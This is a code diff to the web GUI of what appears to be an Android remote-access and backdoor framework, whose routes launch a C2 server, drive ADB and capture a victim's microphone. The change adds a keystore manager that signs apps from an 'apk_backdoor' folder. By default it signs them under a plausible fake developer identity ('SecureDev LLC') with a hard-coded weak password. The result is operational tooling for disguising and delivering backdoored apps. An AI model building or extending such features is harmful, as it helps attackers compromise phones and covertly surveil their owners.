@@ -248,6 +248,7 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/lhost":                self._api_lhost()
         elif p == "/api/qr":                   self._api_qr()
         elif p == "/api/settings":             self._api_get_settings()
+        elif p == "/api/keystore/info":        self._api_keystore_info()
         elif p == "/api/c2/launch":            self._api_c2_launch()
         elif p == "/api/c2/stop":              self._api_c2_stop()
         elif p == "/api/c2/status":            self._api_c2_status()
@@ -282,6 +283,7 @@ class _Handler(BaseHTTPRequestHandler):
         elif p == "/api/kill":              self._api_kill()
         elif p == "/api/adb":               self._api_adb(body)
         elif p == "/api/settings":          self._api_settings(body)
+        elif p == "/api/keystore/gen":      self._api_keystore_gen(body)
         elif p == "/api/media/mic/start":   self._api_mic_start(body)
         elif p == "/api/media/mic/stop":    self._api_mic_stop()
         elif p == "/api/media/mic/msf":     self._api_mic_msf(body)
@@ -1588,6 +1590,75 @@ class _Handler(BaseHTTPRequestHandler):
         _gui_settings.update({k: v for k, v in body.items() if k in
             ("lhost", "lport", "bore_server", "nvd_api_key", "c2_host", "c2_port")})
         self._json({"ok": True, "settings": _gui_settings})
+
+    # ── keystore management ───────────────────────────────────────────────────
+
+    _KS_PATH   = Path(__file__).parent / "apk_backdoor" / "secv.keystore"
+    _KS_CFG    = Path(__file__).parent / "apk_backdoor" / "keystore.json"
+    _KS_FIELDS = ("alias","storepass","keypass","cn","ou","o","l","st","c","validity")
+
+    def _ks_cfg(self) -> dict:
+        try:
+            return json.loads(self._KS_CFG.read_text()) if self._KS_CFG.exists() else {}
+        except Exception:
+            return {}
+
+    def _api_keystore_info(self):
+        ks = self._KS_PATH
+        cfg = self._ks_cfg()
+        if not ks.exists():
+            self._json({"exists": False, "cfg": cfg}); return
+        sp = cfg.get("storepass", "secv1234")
+        try:
+            r = subprocess.run(
+                ["keytool", "-list", "-v", "-keystore", str(ks), "-storepass", sp],
+                capture_output=True, text=True, timeout=10
+            )
+            info = {"exists": True, "cfg": cfg}
+            for line in r.stdout.splitlines():
+                s = line.strip()
+                if s.startswith("Owner:"):            info["owner"]       = s[6:].strip()
+                elif s.startswith("Valid from:"):     info["validity_str"]= s[11:].strip()
+                elif "SHA-256:" in s:                 info["fingerprint"] = s.split("SHA-256:")[-1].strip()
+                elif s.startswith("Alias name:"):     info["alias"]       = s[11:].strip()
+                elif s.startswith("Creation date:"):  info["created"]     = s[14:].strip()
+            self._json(info)
+        except Exception as e:
+            self._json({"exists": True, "cfg": cfg, "error": str(e)})
+
+    def _api_keystore_gen(self, body: dict):
+        ks  = self._KS_PATH
+        cfg = self._ks_cfg()
+        cfg.update({k: body[k] for k in self._KS_FIELDS if k in body})
+        alias  = cfg.get("alias",     "secv")
+        sp     = cfg.get("storepass", "secv1234")
+        kp     = cfg.get("keypass",   "secv1234")
+        cn     = cfg.get("cn",  "SecureDev LLC")
+        ou     = cfg.get("ou",  "Mobile Applications")
+        o      = cfg.get("o",   "SecureDev LLC")
+        l      = cfg.get("l",   "Austin")
+        st     = cfg.get("st",  "Texas")
+        c      = cfg.get("c",   "US")
+        val    = str(cfg.get("validity", 10000))
+        dname  = f"CN={cn},OU={ou},O={o},L={l},ST={st},C={c}"
+        kt = shutil.which("keytool")
+        if not kt:
+            self._json({"ok": False, "error": "keytool not found — install JDK"}); return
+        try:
+            if ks.exists(): ks.unlink()
+            r = subprocess.run([
+                "keytool", "-genkeypair", "-v",
+                "-keystore", str(ks), "-alias", alias,
+                "-keyalg", "RSA", "-keysize", "2048",
+                "-validity", val, "-storepass", sp, "-keypass", kp,
+                "-dname", dname, "-storetype", "PKCS12",
+            ], capture_output=True, text=True, timeout=30)
+            if r.returncode != 0:
+                self._json({"ok": False, "error": r.stderr[:400]}); return
+            self._KS_CFG.write_text(json.dumps(cfg, indent=2))
+            self._json({"ok": True, "dname": dname})
+        except Exception as e:
+            self._json({"ok": False, "error": str(e)})
 
     def _api_c2_status(self):
         qs   = parse_qs(urlparse(self.path).query)
@@ -3285,7 +3356,36 @@ input[type=checkbox]:focus{outline:none;}
       </div>
       <button id="save-settings" onclick="saveSettings()">💾 Save settings</button>
       <button class="tb-btn" style="margin-left:8px;margin-top:8px;" onclick="detectLhost()">⟳ Auto-detect LHOST</button>
-      <div style="display:flex;align-items:center;gap:8px;margin:12px 0 6px;">
+
+      <!-- KEYSTORE MANAGER -->
+      <div style="display:flex;align-items:center;gap:10px;margin:16px 0 6px;">
+        <div style="color:var(--grey);font-size:0.58rem;letter-spacing:0.18em;text-transform:uppercase;font-weight:700;">Signing Keystore</div>
+        <div id="ks-status-pill" style="font-size:0.55rem;letter-spacing:0.1em;padding:1px 8px;border:1px solid var(--border2);color:var(--muted);font-family:var(--mono);"></div>
+      </div>
+      <div id="ks-cert-info" style="display:none;background:var(--bg1);border:1px solid var(--border2);padding:8px 12px;margin-bottom:10px;font-family:var(--mono);font-size:0.62rem;line-height:1.7;color:var(--text);">
+        <div><span style="color:var(--muted);letter-spacing:0.08em;">OWNER</span>&nbsp;&nbsp;<span id="ks-owner"></span></div>
+        <div><span style="color:var(--muted);letter-spacing:0.08em;">VALID</span>&nbsp;&nbsp;<span id="ks-valid"></span></div>
+        <div><span style="color:var(--muted);letter-spacing:0.08em;">SHA256</span>&nbsp;<span id="ks-fp" style="color:var(--grey2);font-size:0.58rem;word-break:break-all;"></span></div>
+      </div>
+      <div class="settings-grid" id="ks-form">
+        <div class="field"><label>CN (Common Name)</label><input id="ks-cn" type="text" placeholder="SecureDev LLC"></div>
+        <div class="field"><label>O (Organization)</label><input id="ks-o"  type="text" placeholder="SecureDev LLC"></div>
+        <div class="field"><label>OU (Unit)</label><input id="ks-ou" type="text" placeholder="Mobile Applications"></div>
+        <div class="field"><label>L (City)</label><input id="ks-l"  type="text" placeholder="Austin"></div>
+        <div class="field"><label>ST (State)</label><input id="ks-st" type="text" placeholder="Texas"></div>
+        <div class="field"><label>C (Country 2-letter)</label><input id="ks-c"  type="text" placeholder="US" maxlength="2"></div>
+        <div class="field"><label>Alias</label><input id="ks-alias" type="text" placeholder="secv"></div>
+        <div class="field"><label>Store password</label><input id="ks-sp" type="text" placeholder="secv1234"></div>
+        <div class="field"><label>Key password</label><input id="ks-kp" type="text" placeholder="secv1234"></div>
+        <div class="field"><label>Validity (days)</label><input id="ks-val" type="text" placeholder="10000"></div>
+      </div>
+      <div style="display:flex;align-items:center;gap:8px;margin-top:8px;flex-wrap:wrap;">
+        <button class="tb-btn" onclick="genKeystore()" id="ks-gen-btn">Generate keystore</button>
+        <button class="tb-btn" onclick="loadKeystoreInfo()" title="Re-read current cert">Refresh cert info</button>
+        <span id="ks-gen-msg" style="font-family:var(--mono);font-size:0.62rem;color:var(--muted);"></span>
+      </div>
+
+      <div style="display:flex;align-items:center;gap:8px;margin:16px 0 6px;">
         <div style="color:var(--grey);font-size:0.58rem;letter-spacing:0.18em;text-transform:uppercase;font-weight:700;">Dependencies</div>
         <span id="dep-pkgmgr" style="display:none;font-family:var(--mono);font-size:0.55rem;letter-spacing:0.1em;padding:1px 7px;border:1px solid var(--cat-c2);color:var(--cat-c2);text-transform:uppercase;"></span>
       </div>
@@ -5248,6 +5348,80 @@ function updateLhostDisplay() {
   el.textContent = settings.lhost ? `lhost: ${settings.lhost}` : '';
 }
 
+// ── Keystore manager ──────────────────────────────────────────────────────────
+function loadKeystoreInfo() {
+  const pill = document.getElementById('ks-status-pill');
+  const info = document.getElementById('ks-cert-info');
+  pill.textContent = 'loading…';
+  fetch('/api/keystore/info').then(r => r.json()).then(d => {
+    if (!d.exists) {
+      pill.textContent = 'NOT FOUND';
+      pill.style.color = 'var(--red)';
+      pill.style.borderColor = 'rgba(229,57,53,0.4)';
+      info.style.display = 'none';
+    } else {
+      pill.textContent = d.error ? 'READ ERROR' : 'OK';
+      pill.style.color = d.error ? 'var(--red)' : 'var(--green)';
+      pill.style.borderColor = d.error ? 'rgba(229,57,53,0.4)' : 'rgba(76,175,80,0.4)';
+      if (!d.error) {
+        document.getElementById('ks-owner').textContent = d.owner || '—';
+        document.getElementById('ks-valid').textContent = d.validity_str || '—';
+        document.getElementById('ks-fp').textContent    = d.fingerprint || '—';
+        info.style.display = 'block';
+      }
+    }
+    const cfg = d.cfg || {};
+    const f = (id, key, def) => { const el = document.getElementById(id); if (el && !el.value) el.value = cfg[key] || def; };
+    f('ks-cn',    'cn',        'SecureDev LLC');
+    f('ks-o',     'o',         'SecureDev LLC');
+    f('ks-ou',    'ou',        'Mobile Applications');
+    f('ks-l',     'l',         'Austin');
+    f('ks-st',    'st',        'Texas');
+    f('ks-c',     'c',         'US');
+    f('ks-alias', 'alias',     'secv');
+    f('ks-sp',    'storepass', 'secv1234');
+    f('ks-kp',    'keypass',   'secv1234');
+    f('ks-val',   'validity',  '10000');
+  }).catch(() => {
+    pill.textContent = 'ERROR';
+    pill.style.color = 'var(--red)';
+  });
+}
+
+function genKeystore() {
+  const btn = document.getElementById('ks-gen-btn');
+  const msg = document.getElementById('ks-gen-msg');
+  const g   = id => document.getElementById(id)?.value.trim();
+  btn.disabled = true;
+  msg.style.color = 'var(--muted)';
+  msg.textContent = 'generating…';
+  fetch('/api/keystore/gen', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({
+      cn: g('ks-cn'), o: g('ks-o'), ou: g('ks-ou'),
+      l: g('ks-l'), st: g('ks-st'), c: g('ks-c'),
+      alias: g('ks-alias'), storepass: g('ks-sp'), keypass: g('ks-kp'),
+      validity: parseInt(g('ks-val')) || 10000
+    })
+  }).then(r => r.json()).then(d => {
+    btn.disabled = false;
+    if (d.ok) {
+      msg.style.color = 'var(--green)';
+      msg.textContent = `generated — ${d.dname}`;
+      // force re-read so cert panel refreshes with empty fields to load from server
+      document.querySelectorAll('#ks-form input').forEach(el => el.value = '');
+      loadKeystoreInfo();
+    } else {
+      msg.style.color = 'var(--red)';
+      msg.textContent = d.error || 'failed';
+    }
+  }).catch(e => {
+    btn.disabled = false;
+    msg.style.color = 'var(--red)';
+    msg.textContent = String(e);
+  });
+}
+
 function loadDeps() {
   const grid  = document.getElementById('dep-grid');
   const badge = document.getElementById('dep-pkgmgr');
@@ -6239,7 +6413,7 @@ function switchTab(tab) {
   if (tab === 'pd')          { pdRefreshSessions(); pdCheckApkStatus(); pdFormUpd(); }
   if (tab === 'msf-console') { checkMsfStatus2(); if (_msfEs && !_msf2Listening) attachMsf2(); }
   if (tab === 'files')       { loadFiles(); }
-  if (tab === 'setup')       { loadDeps(); }
+  if (tab === 'setup')       { loadDeps(); loadKeystoreInfo(); }
   if (tab === 'c2')          { checkC2Status(); }
   if (tab === 'live')        { onLiveTabOpen(); }
 }
